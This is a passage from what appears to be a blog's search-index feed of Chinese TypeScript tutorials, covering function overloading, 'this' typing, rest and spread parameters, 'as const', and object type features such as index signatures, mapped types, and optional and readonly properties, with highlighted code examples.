? <span class="literal">true</span> : <span class="literal">false</span> : <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>思路就是判断 <code>A 是否包含于 B</code> 且 <code>B 是否包含于 A</code>，那么为 true，否则为 false</p><p><strong>很遗憾，不完全对</strong>，看起来很正确，其实因为 分开计算 的规则下，得到的并不是这样的结果</p><h4 id="获取对象的-value"><a href="#获取对象的-value" class="headerlink" title="获取对象的 value"></a>获取对象的 value</h4><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Person</span> = &#123; <span class="attr">name</span>: <span class="built_in">string</span>; <span class="attr">age</span>: <span class="built_in">number</span>; &#125;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">GetKeyType</span>&lt;T, K <span class="keyword">extends</span> keyof T&gt; = T[K]</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Result</span> = <span class="title class_">GetKeyType</span>&lt;<span class="title class_">Person</span>, <span class="string">&#x27;name&#x27;</span>&gt; <span class="comment">// string</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript全解：深入对象与函数（下）</title>
      <link href="/Blog/2023/06/11/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E6%B7%B1%E5%85%A5%E5%AF%B9%E8%B1%A1%E4%B8%8E%E5%87%BD%E6%95%B0%EF%BC%88%E4%B8%8B%EF%BC%89/index/"/>
      <url>/Blog/2023/06/11/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E6%B7%B1%E5%85%A5%E5%AF%B9%E8%B1%A1%E4%B8%8E%E5%87%BD%E6%95%B0%EF%BC%88%E4%B8%8B%EF%BC%89/index/</url>
      
        <content type="html"><![CDATA[<h2 id="函数重载（overload）"><a href="#函数重载（overload）" class="headerlink" title="函数重载（overload）"></a>函数重载（overload）</h2><p>什么是函数重载？简单来说就是同名的函数，这个概念是从 java 来的</p><p>我们来看这个需求，一个方法接受的参数有两种情况，可能是 number，可能是 string</p><p>如果用 TS 来实现，非常简单</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">X</span> &#123;</span><br><span class="line">  <span class="title function_">method</span>(<span class="params">n: <span class="built_in">number</span> | <span class="built_in">string</span></span>) &#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是 java 不支持这种情况的联合类型，但是遇到这种需求该怎么办呢？java 的设计者当时又不想直接弄出这么个联合类型，那干脆让一个方法写两遍好了</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> X <span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  method(n: number) &#123;</span></span><br><span class="line"><span class="comment">    /* ... */</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line">  <span class="keyword">method</span><span class="params">(n: string)</span> <span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    /* ... */</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是 java 就诞生了一个新语法，一个类的方法是可以同名的，用你的参数类型和个数来判断会具体执行那个函数（很奇怪的语法吧~）</p><p>所以重载是为了解决 java 的一个问题</p><p>其实在很久之前大家都应该接触过函数重载，在 JQuery 时代的 Selector 一样</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&#x27;#div&#x27;</span>)</span><br><span class="line">$(<span class="variable language_">window</span>)</span><br><span class="line">$...</span><br></pre></td></tr></table></figure><p>也许内部使用了大量的 if else，所以说 js 不需要重载这个特性，也能做出一样的效果</p><p>但是说回 TS，我认为只有这些情况可能需要用重载</p><p>一个创建日期的函数，可以接受一个数量 number，也能接受具体的日期</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">createData</span>(<span class="params">n: <span class="built_in">number</span></span>): <span class="title class_">Date</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createData</span>(<span class="params">year: <span class="built_in">number</span>, month: <span class="built_in">number</span>, date: <span class="built_in">number</span></span>): <span class="title class_">Date</span></span><br><span class="line"> <span class="comment">// <span class="doctag">TODO:</span> 注意：下面这里会和 java 稍微不同一点</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createData</span>(<span class="params">a: <span class="built_in">number</span>, b?: <span class="built_in">number</span>, c?: <span class="built_in">number</span></span>): <span class="title class_">Date</span> &#123; <span class="comment">// <span class="doctag">TODO:</span> 最后一个实现的签名需要兼容上面所有的情况</span></span><br><span class="line">  <span class="keyword">if</span> (a !== <span class="literal">undefined</span> &amp;&amp; b !== <span class="literal">undefined</span> &amp;&amp; c !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(a,b,c)</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a !== <span class="literal">undefined</span> &amp;&amp; b === <span class="literal">undefined</span> &amp;&amp; c === <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(a)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;只接受一个或三个参数&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也许也能用联合类型➕if else 实现出来，但是重载会更优雅一点</p><blockquote><p>但是我个人依然保持能不用就不用的态度看待它，就算遇到这种问题，为何非要用一个函数来解决，用两个不同名称的函数来不香么，createDataByNumber 和 createDataByYMD</p><p>其实如果你是一个库的封装者，像 JQuery 一样，把函数封装的复杂度留给自己，使用函数重载能方便使用者<br>但如果你是想把函数的使用权交给用户，就应该多明明几个函数提供用户任意组合使用</p></blockquote><h2 id="this"><a href="#this" class="headerlink" title="this"></a>this</h2><p>在 TS 中怎么定义 this 的类型呢？</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"><span class="variable language_">this</span>: Person, word: <span class="built_in">string</span></span>) &#123; <span class="comment">// <span class="doctag">TODO:</span> 这个地方好奇 this 为什么会在参数上的人，请看我的 javascript-this 文章</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>, word)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fn</span>(<span class="string">&#x27;hi&#x27;</span>) <span class="comment">// <span class="doctag">TODO:</span> 报错</span></span><br></pre></td></tr></table></figure><p>this 在参数上了，那么该如何调用呢？看下面几种方法：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 强行拼凑出 person.fn()</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">p</span>: <span class="title class_">Person</span> &amp; &#123; <span class="attr">fn</span>: <span class="keyword">typeof</span> fn &#125; = &#123; <span class="attr">name</span>: <span class="string">&#x27;jack&#x27;</span>, fn &#125;</span><br><span class="line">p.<span class="title function_">fn</span>(<span class="string">&#x27;hi&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// fn.call()</span></span><br><span class="line">fn.<span class="title function_">call</span>(&#123; <span class="attr">name</span>: <span class="string">&#x27;jack&#x27;</span> &#125;, <span class="string">&#x27;hi&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// fn.apply()</span></span><br><span class="line">fn.<span class="title function_">apply</span>(&#123; <span class="attr">name</span>: <span class="string">&#x27;jack&#x27;</span> &#125;, [<span class="string">&#x27;hi&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">// fn.bind()</span></span><br><span class="line">fn.<span class="title function_">bind</span>(&#123; <span class="attr">name</span>: <span class="string">&#x27;jack&#x27;</span> &#125;)(<span class="string">&#x27;hi&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="…-与-参数"><a href="#…-与-参数" class="headerlink" title="… 与 参数"></a>… 与 参数</h3><h4 id="剩余参数"><a href="#剩余参数" class="headerlink" title="剩余参数"></a>剩余参数</h4><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">...x: <span class="built_in">number</span>[]</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> x.<span class="title function_">reduce</span>(<span class="function">(<span class="params">a,b</span>) =&gt;</span> a + b, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">sum</span>(<span class="number">1</span>)</span><br><span class="line"><span class="title function_">sum</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line"><span class="title function_">sum</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>)</span><br></pre></td></tr></table></figure><h4 id="展开参数"><a href="#展开参数" class="headerlink" title="展开参数"></a>展开参数</h4><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">name: <span class="built_in">string</span>, ...rest: <span class="built_in">number</span>[]</span>) &#123;</span><br><span class="line">  <span class="title function_">fn</span>(...rest)</span><br><span class="line">  <span class="comment">// or</span></span><br><span class="line">  fn.<span class="title function_">apply</span>(<span class="literal">null</span>, rest)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params">...x: <span class="built_in">number</span>[]</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(x)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="as-const"><a href="#as-const" class="headerlink" title="as const"></a>as const</h4><p>我们知道 TS 有自动推导</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="string">&#x27;hi&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>此时我们很容易看出来 a 的类型是 string<br>其实这样可能会有些问题<br>理论上来说 a 的类型应该可能是 ‘hi’ 或者 string<br>但是这个 TS 怎么知道我们这个 a 是常量（即类型为 ‘hi’）还是 string 呢？</p></blockquote><p>用 const</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="string">&#x27;hi&#x27;</span> <span class="keyword">as</span> <span class="keyword">const</span></span><br></pre></td></tr></table></figure><p>不对啊，直接用 const 关键词不就好了</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a = <span class="string">&#x27;hi&#x27;</span></span><br></pre></td></tr></table></figure><p>其实大多数的应用场景在对象上，因为 JS 的 const 就是残废</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> array = [<span class="number">1</span>, <span class="string">&#x27;hi&#x27;</span>] <span class="keyword">as</span> <span class="keyword">const</span></span><br></pre></td></tr></table></figure><h4 id="参数对象的析构"><a href="#参数对象的析构" class="headerlink" title="参数对象的析构"></a>参数对象的析构</h4><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Config</span> = &#123;</span><br><span class="line">  <span class="attr">url</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span> | <span class="string">&#x27;POST&#x27;</span> | <span class="string">&#x27;PATCH&#x27;</span>;</span><br><span class="line">  data?: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用一</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ajax</span>(<span class="params">&#123; url, method, ...data &#125;: Config</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用二</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ajax</span>(<span class="params">&#123; url, method, ...data &#125;: Config = &#123;url: <span class="string">&#x27;&#x27;</span>, method: <span class="string">&#x27;GET&#x27;</span>&#125;</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用三</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ajax</span>(<span class="params">&#123; url, method, ...data &#125; = &#123;url: <span class="string">&#x27;&#x27;</span>, method: <span class="string">&#x27;GET&#x27;</span>&#125; <span class="keyword">as</span> Config</span>) &#123;&#125;</span><br></pre></td></tr></table></figure><h4 id="void"><a href="#void" class="headerlink" title="void"></a>void</h4><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f1</span>(<span class="params"></span>): <span class="built_in">void</span> &#123;</span><br><span class="line">  <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2</span>(<span class="params"></span>): <span class="built_in">void</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f3</span>(<span class="params"></span>): <span class="built_in">void</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f4</span>(<span class="params"></span>): <span class="built_in">void</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">null</span> <span class="comment">// <span class="doctag">TODO:</span> 报错</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript全解：深入对象与函数（上）</title>
      <link href="/Blog/2023/06/11/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E6%B7%B1%E5%85%A5%E5%AF%B9%E8%B1%A1%E4%B8%8E%E5%87%BD%E6%95%B0%EF%BC%88%E4%B8%8A%EF%BC%89/index/"/>
      <url>/Blog/2023/06/11/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E6%B7%B1%E5%85%A5%E5%AF%B9%E8%B1%A1%E4%B8%8E%E5%87%BD%E6%95%B0%EF%BC%88%E4%B8%8A%EF%BC%89/index/</url>
      
        <content type="html"><![CDATA[<h2 id="深入对象"><a href="#深入对象" class="headerlink" title="深入对象"></a>深入对象</h2><h3 id="索引签名（Index-Signature）"><a href="#索引签名（Index-Signature）" class="headerlink" title="索引签名（Index Signature）"></a>索引签名（Index Signature）</h3><p>我们已经很熟悉了</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Hash</span> = &#123;</span><br><span class="line">  [<span class="attr">key</span>: stirng]: <span class="built_in">unknown</span>;</span><br><span class="line">  <span class="attr">length</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">List</span> &#123;</span><br><span class="line">  [<span class="attr">key</span>: <span class="built_in">number</span>]: <span class="built_in">unknown</span>;</span><br><span class="line">  <span class="attr">length</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="映射类型（Mapped-Type）"><a href="#映射类型（Mapped-Type）" class="headerlink" title="映射类型（Mapped Type）"></a>映射类型（Mapped Type）</h3><p><strong>多用于泛型</strong></p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">List</span> &#123;</span><br><span class="line">  [key <span class="keyword">in</span> <span class="built_in">string</span>]: <span class="built_in">unknown</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">List</span> &#123;</span><br><span class="line">  [key <span class="keyword">in</span> <span class="built_in">number</span>]: <span class="built_in">unknown</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="可选类型"><a href="#可选类型" class="headerlink" title="可选类型"></a>可选类型</h3><p>对象的某个属性可用可不用</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">  onChange?: <span class="function">() =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">p</span>: <span class="title class_">Person</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;hi&#x27;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">18</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="只读类型"><a href="#只读类型" class="headerlink" title="只读类型"></a>只读类型</h3><p>表示只读，不能写</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="keyword">readonly</span> <span class="attr">id</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="attr">p</span>: <span class="title class_">Person</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;hi&#x27;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line">  <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">&#125;</span><br><span class="line">p.<span class="property">name</span> = <span class="string">&#x27;new name&#x27;</span></span><br><span class="line"></span><br><span class="line">p.<span class="property">id</span> = <span class="number">2</span> <span class="comment">// <span class="doctag">TODO:</span> 报错，Cannot assign to &#x27;id&#x27; because it is a read-only property.ts</span></span><br></pre></td></tr></table></figure><h2 id="深入函数"><a href="#深入函数" class="headerlink" title="深入函数"></a>深入函数</h2><p>对象的语法全都适用于函数，函数也可以用对象来声明</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> F = &#123;</span><br><span class="line">  <span class="function">(<span class="params">a: <span class="built_in">number</span>, b: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line">  <span class="attr">count</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 普通声明</span></span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">F1</span> = <span class="function">(<span class="params">a: <span class="built_in">number</span>, b: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">void</span></span><br></pre></td></tr></table></figure><h3 id="声明方式"><a href="#声明方式" class="headerlink" title="声明方式"></a>声明方式</h3><p>JS 函数的三种声明方式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f1</span>(<span class="params">a</span>) &#123;</span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> f2 = <span class="keyword">function</span>(<span class="params">a</span>) &#123;</span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">f3</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么相对应 TS 的</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f1</span>(<span class="params">a: <span class="built_in">number</span></span>): <span class="built_in">number</span> &#123;</span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> f2 = <span class="keyword">function</span> (<span class="params">a: <span class="built_in">number</span></span>): <span class="built_in">number</span> &#123;</span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> f3 = (<span class="attr">a</span>: <span class="built_in">number</span>): <span class="function"><span class="params">number</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以把类型提取出来，写在等号左边，比较推荐</span></span><br><span class="line"><span class="keyword">type</span> <span class="variable constant_">F2</span> = <span class="function">(<span class="params">a: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">number</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">f2</span>: <span class="variable constant_">F2</span> = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="可选参数"><a href="#可选参数" class="headerlink" title="可选参数"></a>可选参数</h3><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">addEventListener</span>(<span class="params">eventType: <span class="built_in">string</span>, fn: <span class="built_in">unknown</span>, useCapture?: <span class="built_in">boolean</span></span>) &#123; <span class="comment">// <span class="doctag">TODO:</span> 加上问号就好了</span></span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="参数默认值"><a href="#参数默认值" class="headerlink" title="参数默认值"></a>参数默认值</h3><p>实际情况我们会更倾向于使用默认值</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 和上面的代码等价</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addEventListener</span>(<span class="params">eventType: <span class="built_in">string</span>, fn: <span class="built_in">unknown</span>, useCapture=<span class="literal">false</span></span>) &#123;</span><br><span class="line">  <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="返回值也是函数"><a href="#返回值也是函数" class="headerlink" title="返回值也是函数"></a>返回值也是函数</h3><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Add</span> = <span class="function">(<span class="params">x: <span class="built_in">number</span></span>) =&gt;</span> <span class="function">(<span class="params">y: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">number</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="attr">add</span>: <span class="title class_">Add</span> = <span class="function"><span class="params">a</span> =&gt;</span> <span class="function"><span class="params">b</span> =&gt;</span> a + b</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript全解：类型兼容</title>
      <link href="/Blog/2023/06/10/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E7%B1%BB%E5%9E%8B%E5%85%BC%E5%AE%B9/index/"/>
      <url>/Blog/2023/06/10/typescript/TypeScript%E5%85%A8%E8%A7%A3%EF%BC%9A%E7%B1%BB%E5%9E%8B%E5%85%BC%E5%AE%B9/index/</url>
      
